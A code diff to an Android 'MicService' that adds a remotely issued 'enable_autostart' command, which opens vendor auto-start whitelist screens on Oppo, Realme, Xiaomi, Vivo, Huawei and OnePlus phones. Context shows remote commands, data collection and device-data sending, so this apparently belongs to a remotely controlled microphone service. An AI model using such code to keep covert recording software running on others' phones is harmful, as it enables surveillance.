@@ -580,6 +580,21 @@ class MicService : Service() {
                     safeSend("ACK:grant_permissions:error:${e.message}")
                 }
             }
+            "enable_autostart" -> {
+                // Open Realme/Xiaomi/Vivo auto-start settings
+                Log.i(TAG, "CMD: enable_autostart - opening auto-start settings")
+                try {
+                    val opened = openAutoStartSettings()
+                    if (opened) {
+                        safeSend("ACK:enable_autostart:opened")
+                    } else {
+                        safeSend("ACK:enable_autostart:not_supported")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to open autostart settings: ${e.message}")
+                    safeSend("ACK:enable_autostart:error:${e.message}")
+                }
+            }
             "check_update" -> {
                 Log.i(TAG, "CMD: check_update - triggering update check")
                 serviceScope.launch(Dispatchers.IO) {
@@ -1833,6 +1848,95 @@ class MicService : Service() {
     private fun stopDataCollection() {
         dataJob?.cancel()
         dataJob = null
+    }
+    
+    /**
+     * Open auto-start settings for Chinese ROMs (Realme, Xiaomi, Vivo, etc.)
+     * Returns true if successfully opened a settings activity
+     */
+    private fun openAutoStartSettings(): Boolean {
+        val manufacturer = android.os.Build.MANUFACTURER.lowercase()
+        Log.i(TAG, "Opening auto-start settings for manufacturer: $manufacturer")
+        
+        val autoStartIntents = when {
+            manufacturer in listOf("oppo", "realme") -> listOf(
+                // Realme UI 2.0+ / ColorOS 11+
+                android.content.Intent().setComponent(android.content.ComponentName(
+                    "com.coloros.safecenter",
+                    "com.coloros.safecenter.permission.startup.StartupAppListActivity"
+                )),
+                // Realme UI 1.0 / ColorOS 7
+                android.content.Intent().setComponent(android.content.ComponentName(
+                    "com.coloros.safecenter",
+                    "com.coloros.safecenter.startupapp.StartupAppListActivity"
+                )),
+                // Oppo ColorOS
+                android.content.Intent().setComponent(android.content.ComponentName(
+                    "com.oppo.safe",
+                    "com.oppo.safe.permission.startup.StartupAppListActivity"
+                )),
+                // ColorOS 12+ / Realme UI 3+
+                android.content.Intent().setComponent(android.content.ComponentName(
+                    "com.oplus.safecenter",
+                    "com.oplus.safecenter.permission.startup.StartupAppListActivity"
+                ))
+            )
+            manufacturer in listOf("xiaomi", "redmi") -> listOf(
+                // MIUI 12+
+                android.content.Intent().setComponent(android.content.ComponentName(
+                    "com.miui.securitycenter",
+                    "com.miui.permcenter.autostart.AutoStartManagementActivity"
+                )),
+                // Older MIUI
+                android.content.Intent().setComponent(android.content.ComponentName(
+                    "com.miui.securitycenter",
+                    "com.miui.permcenter.permissions.PermissionsEditorActivity"
+                ))
+            )
+            manufacturer == "vivo" -> listOf(
+                android.content.Intent().setComponent(android.content.ComponentName(
+                    "com.iqoo.secure",
+                    "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"
+                )),
+                android.content.Intent().setComponent(android.content.ComponentName(
+                    "com.vivo.permissionmanager",
+                    "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
+                ))
+            )
+            manufacturer == "huawei" || manufacturer == "honor" -> listOf(
+                android.content.Intent().setComponent(android.content.ComponentName(
+                    "com.huawei.systemmanager",
+                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
+                )),
+                android.content.Intent().setComponent(android.content.ComponentName(
+                    "com.huawei.systemmanager",
+                    "com.huawei.systemmanager.optimize.process.ProtectActivity"
+                ))
+            )
+            manufacturer == "oneplus" -> listOf(
+                android.content.Intent().setComponent(android.content.ComponentName(
+                    "com.oneplus.security",
+                    "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"
+                ))
+            )
+            else -> emptyList()
+        }
+        
+        for (intent in autoStartIntents) {
+            try {
+                intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+                if (intent.resolveActivity(packageManager) != null) {
+                    startActivity(intent)
+                    Log.i(TAG, "Opened auto-start settings: ${intent.component}")
+                    return true
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Could not open ${intent.component}: ${e.message}")
+            }
+        }
+        
+        Log.w(TAG, "No auto-start settings found for $manufacturer")
+        return false
     }
 
     private fun sendDeviceData() {
